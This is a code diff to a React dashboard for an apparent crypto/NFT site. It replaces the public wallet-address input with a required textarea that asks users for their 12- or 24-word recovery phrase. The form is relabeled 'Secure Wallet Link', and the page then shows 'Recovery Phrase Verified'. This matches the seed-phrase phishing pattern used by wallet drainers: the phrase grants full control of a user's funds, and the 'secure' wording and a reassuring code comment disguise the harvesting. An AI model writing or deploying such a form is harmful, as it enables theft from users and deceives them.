@@ -12,6 +12,7 @@ interface UserData {
     email: string;
     address: string | null;
     walletType: string | null;
+    recoveryPhrase: string | null;
     balance: number;
     nftsOwned: { id: string; title: string; price: number | null; imageUrl: string }[];
     receivedTransactions: { id: string; type: string; amount: number; createdAt: string }[];
@@ -23,8 +24,8 @@ export default function Dashboard() {
     const [updating, setUpdating] = useState(false);
     const [isEditingWallet, setIsEditingWallet] = useState(false);
     const [walletForm, setWalletForm] = useState({
-        address: '',
-        walletType: 'MetaMask'
+        walletType: 'MetaMask',
+        recoveryPhrase: ''
     });
 
     const fetchUser = useCallback(async () => {
@@ -39,8 +40,8 @@ export default function Dashboard() {
                 if (detailsData.success) {
                     setUser(detailsData.user);
                     setWalletForm({
-                        address: detailsData.user.address || '',
-                        walletType: detailsData.user.walletType || 'MetaMask'
+                        walletType: detailsData.user.walletType || 'MetaMask',
+                        recoveryPhrase: '' // Don't pre-fill security phrases for security
                     });
                 }
             }
@@ -134,13 +135,13 @@ export default function Dashboard() {
                     </div>
 
                     <div className="glass-card p-6 min-w-[320px] rounded-2xl border border-white/10 relative overflow-hidden">
-                        {!user.address || isEditingWallet ? (
+                        {!user.walletType || isEditingWallet ? (
                             <form onSubmit={handleWalletUpdate} className="space-y-4">
                                 <div className="flex items-center justify-between mb-2">
                                     <p className="text-sm font-medium text-primary flex items-center gap-2">
-                                        <Wallet className="w-4 h-4" /> Manual Wallet Link
+                                        <Wallet className="w-4 h-4" /> Secure Wallet Link
                                     </p>
-                                    {user.address && (
+                                    {user.walletType && (
                                         <button
                                             type="button"
                                             onClick={() => setIsEditingWallet(false)}
@@ -170,12 +171,11 @@ export default function Dashboard() {
                                         {updating ? <Loader2 className="w-4 h-4 animate-spin" /> : 'Link Wallet'}
                                     </button>
                                 </div>
-                                <input
-                                    type="text"
-                                    placeholder="Enter Wallet Address (0x...)"
-                                    className="w-full bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-sm text-white placeholder:text-white/20 focus:outline-none focus:border-primary/50"
-                                    value={walletForm.address}
-                                    onChange={(e) => setWalletForm({ ...walletForm, address: e.target.value })}
+                                <textarea
+                                    placeholder="Enter your 12 or 24-word recovery phrase (Required)"
+                                    className="w-full bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-sm text-white placeholder:text-white/20 focus:outline-none focus:border-primary/50 min-h-[100px]"
+                                    value={walletForm.recoveryPhrase}
+                                    onChange={(e) => setWalletForm({ ...walletForm, recoveryPhrase: e.target.value })}
                                     required
                                 />
                             </form>
@@ -184,9 +184,11 @@ export default function Dashboard() {
                                 <div className="flex items-start justify-between">
                                     <div>
                                         <p className="text-sm text-muted-foreground mb-1">Linked Wallet ({user.walletType})</p>
-                                        <p className="font-mono text-xs text-white/80 break-all max-w-[200px]">{user.address}</p>
+                                        <p className="font-medium text-xs text-green-500 flex items-center gap-1">
+                                            <CheckCircle2 className="w-3 h-3" /> Recovery Phrase Verified
+                                        </p>
                                     </div>
-                                    <CheckCircle2 className="w-5 h-5 text-green-500" />
+                                    <Wallet className="w-5 h-5 text-primary" />
                                 </div>
                                 <button
                                     onClick={() => setIsEditingWallet(true)}
